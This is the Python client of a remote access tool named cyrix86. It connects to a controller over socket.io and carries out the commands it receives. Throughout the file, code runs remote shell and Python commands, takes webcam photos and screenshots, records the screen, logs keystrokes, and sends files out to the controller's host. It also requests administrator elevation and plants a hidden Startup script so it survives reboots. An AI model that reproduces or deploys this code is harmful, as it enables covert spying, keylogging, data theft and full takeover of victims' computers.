"""
Created by: Madhanmaaz
Github: https://github.com/madhanmaaz/cyrix86-module
Website: https://madhanmaaz.netlify.app
Description: cyrix86 client app using socket.io
"""

import subprocess
import mss.tools
import keyboard
import socketio
import requests
import string
import base64
import random
import ctypes
import time
import json
import mss
import sys
import os

ORIGIN, options = base64.b64decode(sys.argv[1]).decode().split("/p?")

options = options.split("-")
P_APP = options[0] == "1"
STARTUP = options[1] == "1"
UAC = options[2] == "1"

USER_DOMAIN = os.environ.get("USERDOMAIN", "UNKNOWN")
USER_NAME = os.environ.get("USERNAME", "UNKNOWN")
ID = f"{USER_DOMAIN}-{USER_NAME}"

if ctypes.windll.shell32.IsUserAnAdmin():
    ID = ID + '-UAC'

USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASE_FOLDER_NAME = os.path.dirname(sys.executable).split("\\")[-1]
TEMP = os.environ.get("TEMP", os.environ.get("APPDATA", "UNKNOWN"))
SIO = socketio.Client()


def randomString(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def getFileName(ext):
    timeStamp = time.strftime("%Y-%m-%d-%H-%M-%S")
    return os.path.join(TEMP, f"{timeStamp}-{randomString(5)}.{ext}")


def _exit():
    SIO.disconnect()
    os._exit(0)


def toServer(data):
    if not SIO.connected: return
    SIO.emit("to-server", data)


class Terminal:
    def __init__(self, options):
        self.type = options.get("type")
        self.app = options.get("app")
        self.value = options.get("value")

        try:
            if self.value[0:3] == "cd ":
                self.changeDirectory()
            else:
                toServer({
                    "type": self.type,
                    "output": self.terminal()
                })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })
            

    def terminal(self):
        if self.app != "cmd": self.value = f"powershell {self.value}"

        result = subprocess.run(
            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        if result.returncode == 0: return result.stdout
        else: return result.stderr


    def changeDirectory(self):
        os.chdir(self.value[3:])
        toServer({
            "type": self.type,
            "output": f"Current Directory: {os.getcwd()}",
            "cwd": os.getcwd()
        })


class Webcam:
    def __init__(self, options):
        self.type = options.get("type")
        self.deviceIndex = int(options.get("deviceIndex"))

        self.snapshot()


    def snapshot(self):
        try:
            import cv2
        except ImportError:
            toServer({
                "type": self.type,
                "output": "Please wait, installing dependencies..."
            })

            return Python({
                "type": self.type,
                "app": "pip",
                "args": "install opencv-python"
            })

        try:
            device = cv2.VideoCapture(self.deviceIndex, cv2.CAP_DSHOW)
        
            if not device.isOpened():
                return toServer({
                    "type": self.type,
                    "output": "Failed to open. webcam not found?"
                })

            time.sleep(0.5)
            ret, frame = device.read()
            device.release()
            if not ret:
                return toServer({
                    "type": self.type,
                    "output": "Failed to capture frame"
                })
            
            filename = getFileName("jpg")
            cv2.imwrite(filename, frame)
            requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
            os.remove(filename)
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


class Display:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.deviceIndex = int(options.get("deviceIndex"))
        self.duration = int(options.get("duration"))
        self.count = int(options.get("count"))

        for _ in range(self.count):
            if self.action == "snapshot":
                self.snapshot()
            elif self.action == "record":
                self.record()
            
            time.sleep(1)


    def snapshot(self):
        try:
            filename = getFileName("jpg")
            with mss.mss() as sct:
                monitor = sct.grab(sct.monitors[self.deviceIndex])
                mss.tools.to_png(monitor.rgb, monitor.size, output=filename)
                requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
                os.remove(filename)
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def record(self):
        try:
            import av
            import numpy as np
        except ImportError:
            toServer({
                "type": self.type,
                "output": "Please wait, installing dependencies..."
            })

            return Python({
                "type": self.type,
                "app": "pip",
                "args": "install av numpy"
            })
        
        try:
            filename = getFileName("mp4")
            sct = mss.mss()
            monitor = sct.monitors[self.deviceIndex]
            width = monitor.get("width")
            height = monitor.get("height")
            output = av.open(filename, mode='w')
            stream = output.add_stream('libx264', rate=15)
            stream.width = width
            stream.height = height
            stream.pix_fmt = 'yuv420p'
            stream.options = {
                'crf': '35',
                'preset': 'ultrafast',
                'tune': 'zerolatency'
            }

            FPS = 15
            for _ in range((self.duration + 2) * FPS): # duration * fps
                img = np.array(sct.grab(monitor))
                frame = av.VideoFrame.from_ndarray(img, format='bgra')
                frame = frame.reformat(format='yuv420p', width=width, height=height)
                for packet in stream.encode(frame):
                    output.mux(packet)
                time.sleep(1 / FPS)
            
            for packet in stream.encode():
                output.mux(packet)

            output.close()
            requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
            os.remove(filename)
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


class Sound:
    def __init__(self, options):
        self.type = options.get("type")
        self.filePath = options.get("filePath")

        self.play()
    
    def play(self):
        try:
            import winsound
            if not os.path.exists(self.filePath):
                return toServer({
                    "type": self.type,
                    "output": f"ERROR: File not found: {self.filePath}"
                })
            
            winsound.PlaySound(self.filePath, winsound.SND_FILENAME | winsound.SND_ASYNC)
            toServer({
                "type": self.type,
                "output": f"Playing: {self.filePath}"
            })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


class Notifications:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.title = options.get("title")
        self.message = options.get("message")
        self.icon = int(options.get("icon"))
        self.buttons = int(options.get("buttons"))

        if self.action == "messagebox":
            self.messagebox()
        elif self.action == "toast":
            self.toast()
    
    def messagebox(self):
        try:
            toServer({
                "type": self.type,
                "output": f"Messagebox opened successfully"
            })
            ctypes.windll.user32.MessageBoxW(0, self.title, self.message, self.buttons | self.icon)
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def toast(self):
        try:
            import win10toast
        except ImportError:
            toServer({
                "type": self.type,
                "output": "Please wait, installing dependencies..."
            })

            return Python({
                "type": self.type,
                "app": "pip",
                "args": "install win10toast"
            })
        
        try:
            toaster = win10toast.ToastNotifier()
            toaster.show_toast(title=self.title, msg=self.message, duration=10, threaded=True)
            toServer({
                "type": self.type,
                "output": f"Toast opened successfully"
            })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


KEYBOARD_STATE = False
class Keyboard:
    def __init__(self, options):
        global KEYBOARD_STATE
        self.type = options.get("type")
        self.action = options.get("action")

        output = f"Keyboard state: {KEYBOARD_STATE}"
        if self.action == "start" and KEYBOARD_STATE == False:
            KEYBOARD_STATE = True
            self.start()
            output = "Keyboard started"
            
        elif self.action == "stop" and KEYBOARD_STATE:
            KEYBOARD_STATE = False
            self.stop()
            output = "Keyboard stopped"

        toServer({
            "type": self.type,
            "output": output
        })
    

    def start(self):
        keyboard.hook(self.callback)


    def stop(self):
        keyboard.unhook_all()
    

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            toServer({
                "type": self.type,
                "output": event.name
            })


class FileManager:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")
        self.value = options.get("value")

        if self.action == "cwd":
            self.cwd()
        elif self.action == "list":
            self.list()
        elif self.action == "upload":
            self.upload()
        elif self.action == "download":
            self.download()


    def cwd(self):
        try:
            os.chdir(self.value)
            toServer({
                "type": self.type,
                "output": f"Current Directory: {os.getcwd()}",
                "cwd": os.getcwd()
            })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })
    
    def list(self): 
        try:
            files = []
            parent = self.value or os.getcwd()
            for fileName in os.listdir(parent):
                fullPath = os.path.join(parent, fileName)

                if os.path.isfile(fullPath):
                    files.append({
                        "name": fileName,
                        "type": "file",
                    })
                elif os.path.isdir(fullPath):
                    files.append({
                        "name": fileName,
                        "type": "folder"
                    })

            toServer({
                "type": self.type,
                "output": json.dumps(files),
                "parent": parent
            })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def upload(self):
        try:
            response = requests.get(self.value, headers={
                "User-Agent": USERAGENT
            })

            if response.status_code == 200:
                filename = self.value.split("/")[-1]
                filePath = os.path.join(os.getcwd(), filename)
                with open(filePath, "wb") as f:
                    f.write(response.content)

                toServer({
                    "type": self.type,
                    "output": f"File uploaded successfully"
                })
            else:
                toServer({
                    "type": self.type,
                    "output": f"ERROR: File not found"
                })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })

    def download(self):
        try:
            if not os.path.exists(self.value):
                return toServer({
                    "type": self.type,
                    "output": f"ERROR: File not found"
                })
            
            response = requests.post(f"{ORIGIN}/client", files={"file": open(self.value, "rb")}, data={"id": ID,"type": self.type})
            if response.status_code == 200:
                toServer({
                    "type": self.type,
                    "output": f"File downloaded successfully"
                })
            else:
                toServer({
                    "type": self.type,
                    "output": f"ERROR: Failed to download file"
                })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


class Python:
    def __init__(self, options):
        self.type = options.get("type")
        self.app = options.get("app")
        self.args = options.get("args")
        self.code = options.get("code", "")

        if self.app == "python":
            self.run()

        elif self.app == "pip":
            self.pip()


    def run(self): 
        try:
            filename = getFileName("py")
            with open(filename, "w") as f:
                f.write(self.code)

            result = subprocess.run(f'"{sys.executable}" "{filename}"', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = result.stdout
            if result.returncode != 0: output = result.stderr
            toServer({
                "type": self.type,
                "output": output
            })
            os.remove(filename)
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def pip(self):
        try:
            if not self.args: return
            pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
            toServer({
                "type": self.type,
                "output": f"Running pip {self.args}"
            })

            result = subprocess.run(f'"{pipPath}" {self.args}', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

            output = result.stdout
            if result.returncode != 0: output = result.stderr
            toServer({
                "type": self.type,
                "output": output
            })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })

class Others:
    def __init__(self, options):
        self.type = options.get("type")
        self.action = options.get("action")

        if self.action == "uac":
            self.uac()
        elif self.action == "startup":
            self.startup()
        elif self.action == "exit":
            self.exit()


    def uac(self):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                res = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{sys.argv[0]}" {sys.argv[1]}', None, 0)
                if res == 42:
                    toServer({
                        "type": self.type,
                        "output": f"UAC request is accepted. Now opening a new instance with new ID: {ID}-UAC"
                    })
                    time.sleep(1)
                    _exit()
                else:
                    toServer({
                        "type": self.type,
                        "output": "UAC request is denied"
                    })
            else:
                toServer({
                    "type": self.type,
                    "output": "UAC is already enabled"
                })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def startup(self):
        try:
            startupFile = os.path.join(
                os.environ["APPDATA"],
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
                f"System.vbs",
            )

            with open(startupFile, "w",) as f:
                f.write(f'''' python installer
CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
            
            if os.path.exists(startupFile):
                toServer({
                    "type": self.type,
                    "output": f"Startup file created successfully"
                })
            else:
                toServer({
                    "type": self.type,
                    "output": f"Startup file creation failed"
                })
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


    def exit(self):
        try:
            _exit()
        except Exception as e:
            toServer({
                "type": self.type,
                "output": f"ERROR: {e}"
            })


HANDLER_MAP = {
    "terminal": Terminal,
    "webcam": Webcam,
    "display": Display,
    "sound": Sound,
    "notifications": Notifications,
    "keyboard": Keyboard,
    "filemanager": FileManager,
    "python": Python,
    "others": Others,
}

@SIO.on("connect")
def onConnect():
    doneFile = os.path.join(os.environ.get("APPDATA"), "pythonDone")
    if not os.path.exists(doneFile):
        os.mkdir(doneFile)

    SIO.emit("to-server", {
        "type": "terminal",
        "output": f"Current Directory: {os.getcwd()}",
        "cwd": os.getcwd()
    })


@SIO.on("disconnect")
def onDisconnect():
    pass


@SIO.on("receiver")
def onReceiver(data):
    HANDLER_MAP.get(data.get("type"))(data)


def main():
    if STARTUP: Others({"type": "startup"})
    if UAC: Others({"type": "uac"})

    while True:
        try:
            SIO.connect(ORIGIN, wait_timeout=10, auth={
                "id": ID,
                "clientType": "python"
            })
            SIO.wait()
            break
        except:
            time.sleep(4)


if __name__ == "__main__":
    main()